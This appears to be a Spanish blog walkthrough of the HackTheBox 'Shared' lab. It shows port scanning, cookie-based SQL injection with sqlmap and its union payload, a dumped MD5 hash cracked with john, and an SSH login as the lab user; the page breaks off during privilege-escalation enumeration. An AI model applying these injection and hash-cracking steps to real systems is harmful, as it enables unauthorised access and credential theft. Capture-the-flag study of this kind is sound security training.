<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Shared (medium) | MiguelRega7 - blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="HackTheBox - Shared (medium)" />
<meta name="author" content="MiguelRega7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<link rel="canonical" href="http://localhost:4000/hackthebox/machines/hard/2024/05/26/shared.html" />
<meta property="og:url" content="http://localhost:4000/hackthebox/machines/hard/2024/05/26/shared.html" />
<meta property="og:site_name" content="MiguelRega7 - blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-05-26T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackTheBox - Shared (medium)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-05-26T00:00:00-06:00","datePublished":"2024-05-26T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Shared (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/hard/2024/05/26/shared.html"},"url":"http://localhost:4000/hackthebox/machines/hard/2024/05/26/shared.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Shared (medium)</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-05-26T00:00:00-06:00" itemprop="datePublished">
        May 26, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/bf928375e067672d42a572d81684537b.png" />
</p>

<ul>
  <li>Shared is a Medium Difficulty Linux machine that features a Cookie SQL Injection leading to a foothold, which is then used to escalate privileges by reverse engineering a Golang binary and leveraging two CVEs to gain a root shell.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos con el escaneo de puertos y servicios abiertos por el protocolo <strong>TCP</strong> en la maquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,443 10.10.11.172 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-26 12:59 CST
Nmap scan report <span class="k">for </span>10.10.11.172
Host is up <span class="o">(</span>0.092s latency<span class="o">)</span><span class="nb">.</span>

PORT	STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 <span class="o">(</span>RSA<span class="o">)</span>
|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http     nginx 1.18.0
|_http-title: Did not follow redirect to http://shared.htb
|_http-server-header: nginx/1.18.0
443/tcp open  ssl/http nginx 1.18.0
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn:
|   h2
|_  http/1.1
|_http-server-header: nginx/1.18.0
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span><span class="k">*</span>.shared.htb/organizationName<span class="o">=</span>HTB/stateOrProvinceName<span class="o">=</span>None/countryName<span class="o">=</span>US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
|_http-title: Did not follow redirect to https://shared.htb
| tls-nextprotoneg:
|   h2
|_  http/1.1
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Ahora agregamos el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.172 shared.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.172 shared.htb
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/1.png" />
</p>

<ul>
  <li>
    <p>Es una tienda vamos agregar una producto al carrito.</p>
  </li>
  <li>
    <p>Si le damos en procesar el pedido vemos que nos redirige a otro subdominio.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/2.png" />
</p>

<ul>
  <li>
    <p>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
  </li>
  <li>
    <p>Si le damos en <code class="language-plaintext highlighter-rouge">Proceed to checkout</code> nos lleva al subdominio.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/3.png" />
</p>

<h2 id="sql-injection">SQL Injection</h2>

<ul>
  <li>Si ponemos datos cualquiera como input vemos que solo nos dice que el pago se realizo con éxito.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/4.png" />
</p>

<ul>
  <li>Vemos que se están empleando <code class="language-plaintext highlighter-rouge">cookies</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/5.png" />
</p>

<ul>
  <li>Vamos a capturar la petición con <code class="language-plaintext highlighter-rouge">Burpsuite</code> en el momento en el que demos <code class="language-plaintext highlighter-rouge">click</code> ala hora de darle en <code class="language-plaintext highlighter-rouge">proceed to checkout</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/6.png" />
</p>

<ul>
  <li>Si <code class="language-plaintext highlighter-rouge">urldecodiamos</code> la parte de la <code class="language-plaintext highlighter-rouge">cookie</code> vemos los datos que nos muestra a la hora de pagar.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/7.png" />
</p>

<ul>
  <li>Si cambiamos el numero vemos que se refleja.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/8.png" />
</p>

<ul>
  <li>Si aplicamos una inyección <code class="language-plaintext highlighter-rouge">sql</code> para hacer un ordenamiento basándonos en la 3 columna vemos no nos da ningún error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/9.png" />
</p>

<ul>
  <li>
    <p>Ahora bueno si cambiamos de numero nos da error a si que con esto sabemos que hay 3 columnas con esto ya podemos aplicar un <code class="language-plaintext highlighter-rouge">union select</code> para las 3 columnas, lo que debemos hacer es probar en algún campo para ver si se refleja nuestro output para ver el nombre de la base de datos actualmente en uso.</p>
  </li>
  <li>
    <p>Pero como tal no nos deja hasta que cambiemos la parte del <code class="language-plaintext highlighter-rouge">product</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/10.png" />
</p>

<ul>
  <li>También podemos escribir en el campo 3.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/11.png" />
</p>

<ul>
  <li>Ahora podemos listar las bases de datos existentes.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/12.png" />
</p>

<ul>
  <li>Ahora vamos a enumerar las tablas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/13.png" />
</p>

<ul>
  <li>Ahora enumeramos las columnas para la tabla <code class="language-plaintext highlighter-rouge">user</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/14.png" />
</p>

<ul>
  <li>Ahora vemos el contenido de las tablas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/15.png" />
</p>

<ul>
  <li>También lo pudimos haber hecho con <code class="language-plaintext highlighter-rouge">sqlmap</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap sqlmap <span class="nt">-u</span> <span class="s2">"https://checkout.shared.htb/"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'custom_cart={"*":"1"}'</span> <span class="nt">--technique</span> U <span class="nt">--union-cols</span> 3 <span class="nt">--batch</span>
        ___
       __H__
 ___ ___[<span class="o">(]</span>_____ ___ ___  <span class="o">{</span>1.8.3#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[)]</span>     | .<span class="s1">'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program

<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 13:30:00 /2024-05-26/

custom injection marker <span class="o">(</span><span class="s1">'*'</span><span class="o">)</span> found <span class="k">in </span>option <span class="s1">'--headers/--user-agent/--referer/--cookie'</span><span class="nb">.</span> Do you want to process it? <span class="o">[</span>Y/n/q] Y
<span class="o">[</span>13:30:02] <span class="o">[</span>INFO] testing connection to the target URL
<span class="o">[</span>13:30:03] <span class="o">[</span>INFO] checking <span class="k">if </span>the target is protected by some kind of WAF/IPS
<span class="k">do </span>you want to URL encode cookie values <span class="o">(</span>implementation specific<span class="o">)</span>? <span class="o">[</span>Y/n] Y
<span class="o">[</span>13:30:03] <span class="o">[</span>WARNING] heuristic <span class="o">(</span>basic<span class="o">)</span> <span class="nb">test </span>shows that <span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span> might not be injectable
<span class="o">[</span>13:30:04] <span class="o">[</span>INFO] testing <span class="k">for </span>SQL injection on <span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span>
<span class="o">[</span>13:30:04] <span class="o">[</span>INFO] testing <span class="s1">'Generic UNION query (NULL) - 3 to 3 columns (custom)'</span>
<span class="o">[</span>13:30:04] <span class="o">[</span>WARNING] applying generic concatenation <span class="o">(</span>CONCAT<span class="o">)</span>
injection not exploitable with NULL values. Do you want to try with a random integer value <span class="k">for </span>option <span class="s1">'--union-char'</span>? <span class="o">[</span>Y/n] Y
<span class="o">[</span>13:30:11] <span class="o">[</span>WARNING] <span class="k">if </span>UNION based SQL injection is not detected, please consider forcing the back-end DBMS <span class="o">(</span>e.g. <span class="s1">'--dbms=mysql'</span><span class="o">)</span>
Deleting temporary files - please <span class="nb">wait</span> ... <span class="k">done</span><span class="nb">.</span>
<span class="o">[</span>13:30:19] <span class="o">[</span>INFO] <span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span> is <span class="s1">'Generic UNION query (NULL) - 3 to 3 columns (custom)'</span> injectable
<span class="o">[</span>13:30:19] <span class="o">[</span>INFO] checking <span class="k">if </span>the injection point on <span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span> is a <span class="nb">false </span>positive
<span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">[</span>y/N] N
sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 58 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
<span class="nt">---</span>
Parameter: Cookie <span class="c">#1* ((custom) HEADER)</span>
    Type: UNION query
    Title: Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 4 columns <span class="o">(</span>custom<span class="o">)</span>
    Payload: <span class="nv">custom_cart</span><span class="o">={</span><span class="s2">"' UNION ALL SELECT NULL,CONCAT(CONCAT('qzbxq','mDgXayJoyKUymjwMorkqAOaGsoWQfELOhEkSsvUp'),'qvbkq'),NULL-- qbYb"</span>:<span class="s2">"1"</span><span class="o">}</span>
<span class="nt">---</span>
<span class="o">[</span>13:30:20] <span class="o">[</span>INFO] testing MySQL
<span class="o">[</span>13:30:21] <span class="o">[</span>INFO] confirming MySQL
<span class="o">[</span>13:30:22] <span class="o">[</span>INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL <span class="o">&gt;=</span> 5.0.0 <span class="o">(</span>MariaDB fork<span class="o">)</span>
<span class="o">[</span>13:30:22] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/home/miguel/.local/share/sqlmap/output/checkout.shared.htb'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> ending @ 13:30:22 /2024-05-26/
</code></pre></div></div>

<ul>
  <li>Ahora enumeramos las bases de datos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap sqlmap <span class="nt">-u</span> <span class="s2">"https://checkout.shared.htb/"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'custom_cart={"*":"1"}'</span> <span class="nt">--technique</span> U <span class="nt">--union-cols</span> 3 <span class="nt">--batch</span> <span class="nt">--dbs</span>
        ___
       __H__
 ___ ___[<span class="o">(]</span>_____ ___ ___  <span class="o">{</span>1.8.3#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[</span>.]     | .<span class="s1">'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program

<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 13:31:11 /2024-05-26/

custom injection marker <span class="o">(</span><span class="s1">'*'</span><span class="o">)</span> found <span class="k">in </span>option <span class="s1">'--headers/--user-agent/--referer/--cookie'</span><span class="nb">.</span> Do you want to process it? <span class="o">[</span>Y/n/q] Y
<span class="o">[</span>13:31:12] <span class="o">[</span>INFO] resuming back-end DBMS <span class="s1">'mysql'</span>
<span class="o">[</span>13:31:12] <span class="o">[</span>INFO] testing connection to the target URL
sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
<span class="nt">---</span>
Parameter: Cookie <span class="c">#1* ((custom) HEADER)</span>
    Type: UNION query
    Title: Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 4 columns <span class="o">(</span>custom<span class="o">)</span>
    Payload: <span class="nv">custom_cart</span><span class="o">={</span><span class="s2">"' UNION ALL SELECT NULL,CONCAT(CONCAT('qzbxq','mDgXayJoyKUymjwMorkqAOaGsoWQfELOhEkSsvUp'),'qvbkq'),NULL-- qbYb"</span>:<span class="s2">"1"</span><span class="o">}</span>
<span class="nt">---</span>
<span class="o">[</span>13:31:12] <span class="o">[</span>INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 <span class="o">(</span>MariaDB fork<span class="o">)</span>
<span class="o">[</span>13:31:12] <span class="o">[</span>INFO] fetching database names
<span class="k">do </span>you want to URL encode cookie values <span class="o">(</span>implementation specific<span class="o">)</span>? <span class="o">[</span>Y/n] Y
available databases <span class="o">[</span>2]:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> checkout
<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema

<span class="o">[</span>13:31:13] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/home/miguel/.local/share/sqlmap/output/checkout.shared.htb'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> ending @ 13:31:13 /2024-05-26/
</code></pre></div></div>

<ul>
  <li>Ahora las tablas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap sqlmap <span class="nt">-u</span> <span class="s2">"https://checkout.shared.htb/"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'custom_cart={"*":"1"}'</span> <span class="nt">--technique</span> U <span class="nt">--union-cols</span> 3 <span class="nt">--batch</span> <span class="nt">-D</span> checkout <span class="nt">--tables</span>
        ___
       __H__
 ___ ___[,]_____ ___ ___  <span class="o">{</span>1.8.3#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[</span><span class="s2">"]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:31:48 /2024-05-26/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[13:31:48] [INFO] resuming back-end DBMS 'mysql'
[13:31:48] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns (custom)
    Payload: custom_cart={"</span><span class="s1">' UNION ALL SELECT NULL,CONCAT(CONCAT('</span>qzbxq<span class="s1">','</span>mDgXayJoyKUymjwMorkqAOaGsoWQfELOhEkSsvUp<span class="s1">'),'</span>qvbkq<span class="s1">'),NULL-- qbYb":"1"}
---
[13:31:49] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 (MariaDB fork)
[13:31:49] [INFO] fetching tables for database: '</span>checkout<span class="s1">'
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
Database: checkout
[2 tables]
+---------+
| user    |
| product |
+---------+

[13:31:49] [INFO] fetched data logged to text files under '</span>/home/miguel/.local/share/sqlmap/output/checkout.shared.htb<span class="s1">'

[*] ending @ 13:31:49 /2024-05-26/
</span></code></pre></div></div>

<ul>
  <li>Ahora vemos el <code class="language-plaintext highlighter-rouge">hash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap sqlmap <span class="nt">-u</span> <span class="s2">"https://checkout.shared.htb/"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'custom_cart={"*":"1"}'</span> <span class="nt">--technique</span> U <span class="nt">--union-cols</span> 3 <span class="nt">--batch</span> <span class="nt">-D</span> checkout <span class="nt">-T</span> user <span class="nt">--dump</span>
        ___
       __H__
 ___ ___[,]_____ ___ ___  <span class="o">{</span>1.8.3#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[(]</span>     | .<span class="s1">'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program

<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 13:32:24 /2024-05-26/

custom injection marker <span class="o">(</span><span class="s1">'*'</span><span class="o">)</span> found <span class="k">in </span>option <span class="s1">'--headers/--user-agent/--referer/--cookie'</span><span class="nb">.</span> Do you want to process it? <span class="o">[</span>Y/n/q] Y
<span class="o">[</span>13:32:24] <span class="o">[</span>INFO] resuming back-end DBMS <span class="s1">'mysql'</span>
<span class="o">[</span>13:32:24] <span class="o">[</span>INFO] testing connection to the target URL
sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
<span class="nt">---</span>
Parameter: Cookie <span class="c">#1* ((custom) HEADER)</span>
    Type: UNION query
    Title: Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 4 columns <span class="o">(</span>custom<span class="o">)</span>
    Payload: <span class="nv">custom_cart</span><span class="o">={</span><span class="s2">"' UNION ALL SELECT NULL,CONCAT(CONCAT('qzbxq','mDgXayJoyKUymjwMorkqAOaGsoWQfELOhEkSsvUp'),'qvbkq'),NULL-- qbYb"</span>:<span class="s2">"1"</span><span class="o">}</span>
<span class="nt">---</span>
<span class="o">[</span>13:32:25] <span class="o">[</span>INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 <span class="o">(</span>MariaDB fork<span class="o">)</span>
<span class="o">[</span>13:32:25] <span class="o">[</span>INFO] fetching columns <span class="k">for </span>table <span class="s1">'user'</span> <span class="k">in </span>database <span class="s1">'checkout'</span>
<span class="k">do </span>you want to URL encode cookie values <span class="o">(</span>implementation specific<span class="o">)</span>? <span class="o">[</span>Y/n] Y
<span class="o">[</span>13:32:25] <span class="o">[</span>INFO] fetching entries <span class="k">for </span>table <span class="s1">'user'</span> <span class="k">in </span>database <span class="s1">'checkout'</span>
<span class="o">[</span>13:32:25] <span class="o">[</span>INFO] recognized possible password hashes <span class="k">in </span>column <span class="s1">'password'</span>
<span class="k">do </span>you want to store hashes to a temporary file <span class="k">for </span>eventual further processing with other tools <span class="o">[</span>y/N] N
<span class="k">do </span>you want to crack them via a dictionary-based attack? <span class="o">[</span>Y/n/q] Y
<span class="o">[</span>13:32:26] <span class="o">[</span>INFO] using <span class="nb">hash </span>method <span class="s1">'md5_generic_passwd'</span>
what dictionary <span class="k">do </span>you want to use?
<span class="o">[</span>1] default dictionary file <span class="s1">'/usr/share/sqlmap/data/txt/wordlist.tx_'</span> <span class="o">(</span>press Enter<span class="o">)</span>
<span class="o">[</span>2] custom dictionary file
<span class="o">[</span>3] file with list of dictionary files
<span class="o">&gt;</span> 1
<span class="o">[</span>13:32:26] <span class="o">[</span>INFO] using default dictionary
<span class="k">do </span>you want to use common password suffixes? <span class="o">(</span>slow!<span class="o">)</span> <span class="o">[</span>y/N] N
<span class="o">[</span>13:32:26] <span class="o">[</span>INFO] starting dictionary-based cracking <span class="o">(</span>md5_generic_passwd<span class="o">)</span>
<span class="o">[</span>13:32:26] <span class="o">[</span>INFO] starting 2 processes
<span class="o">[</span>13:33:05] <span class="o">[</span>WARNING] no clear password<span class="o">(</span>s<span class="o">)</span> found
Database: checkout
Table: user
<span class="o">[</span>1 entry]
+----+----------------------------------+-------------+
| <span class="nb">id</span> | password                         | username    |
+----+----------------------------------+-------------+
| 1  | fc895d4eddc2fc12f995e18c865cf273 | james_mason |
+----+----------------------------------+-------------+

<span class="o">[</span>13:33:05] <span class="o">[</span>INFO] table <span class="s1">'checkout.`user`'</span> dumped to CSV file <span class="s1">'/home/miguel/.local/share/sqlmap/output/checkout.shared.htb/dump/checkout/user.csv'</span>
<span class="o">[</span>13:33:05] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/home/miguel/.local/share/sqlmap/output/checkout.shared.htb'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> ending @ 13:33:05 /2024-05-26/
</code></pre></div></div>

<ul>
  <li>También podemos hacer un script en <code class="language-plaintext highlighter-rouge">python3</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 exploit.py
james_mason:fc895d4eddc2fc12f995e18c865cf273
Hash guardado en <span class="s1">'hash.txt'</span>
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 512/512 AVX512BW 16x3]<span class="o">)</span>
Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>2
Press Ctrl-C to abort, or send SIGUSR1 to john process <span class="k">for </span>status
Soleil101        <span class="o">(</span>james_mason<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2024-05-26 13:45<span class="o">)</span> 2.000g/s 4182Kp/s 4182Kc/s 4182KC/s Sportster1..Sjoerd
Use the <span class="s2">"--show --format=Raw-MD5"</span> options to display all of the cracked passwords reliably
Session completed.
0 password hashes cracked, 2 left
</code></pre></div></div>

<ul>
  <li>Aquí pueden ver el script <a href="https://github.com/MikeRega7/Scripts/blob/main/HackTheBox/Shared/exploit.py">https://github.com/MikeRega7/Scripts/blob/main/HackTheBox/Shared/exploit.py</a> .</li>
</ul>

<h2 id="shell-as-james_mason">Shell as james_mason</h2>

<ul>
  <li>Ahora nos conectamos por <code class="language-plaintext highlighter-rouge">ssh</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ssh james_mason@10.10.11.172
The authenticity of host <span class="s1">'10.10.11.172 (10.10.11.172)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:UXHSnbXewSQjJVOjGF5RVNToyJZqtdQyS8hgr5P8pWM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.11.172<span class="s1">' (ED25519) to the list of known hosts.
james_mason@10.10.11.172'</span>s password:
Linux shared 5.10.0-16-amd64 <span class="c">#1 SMP Debian 5.10.127-1 (2022-06-30) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:45:22 2022 from 10.10.14.4
james_mason@shared:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<ul>
  <li>Hay otro usuario a nivel de sistema.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total 16
drwxr-xr-x  4 root        root        4096 Jul 14  2022 <span class="nb">.</span>
drwxr-xr-x 18 root        root        4096 Jul 14  2022 ..
drwxr-xr-x  4 dan_smith   dan_smith   4096 Jul 14  2022 dan_smith
drwxr-xr-x  2 james_mason james_mason 4096 Jul 14  2022 james_mason
james_mason@shared:/home<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Estamos en el grupo <code class="language-plaintext highlighter-rouge">developer</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/home<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>james_mason<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>james_mason<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>james_mason<span class="o">)</span>,1001<span class="o">(</span>developer<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Hay una carpeta la cual esta como grupo asignado <code class="language-plaintext highlighter-rouge">developer</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/home<span class="nv">$ </span>find / <span class="nt">-group</span> developer 2&gt;/dev/null
/opt/scripts_review
</code></pre></div></div>

<ul>
  <li>Tenemos capacidad de escritura.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">touch </span>zi
james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 8
drwxrwx--- 2 root        developer   4096 May 26 15:53 <span class="nb">.</span>
drwxr-xr-x 3 root        root        4096 Jul 14  2022 ..
<span class="nt">-rw-r--r--</span> 1 james_mason james_mason    0 May 26 15:53 zi
</code></pre></div></div>

<ul>
  <li>Pero bueno poca cosa vamos a hacer vamos a usar <code class="language-plaintext highlighter-rouge">pspy</code> para ver tareas que se estén ejecutando en el sistema <a href="https://github.com/DominicBreuker/pspy/releases">https://github.com/DominicBreuker/pspy/releases</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/16.png" />
</p>

<ul>
  <li>
    <p>Ahora lo ejecutamos.</p>
  </li>
  <li>
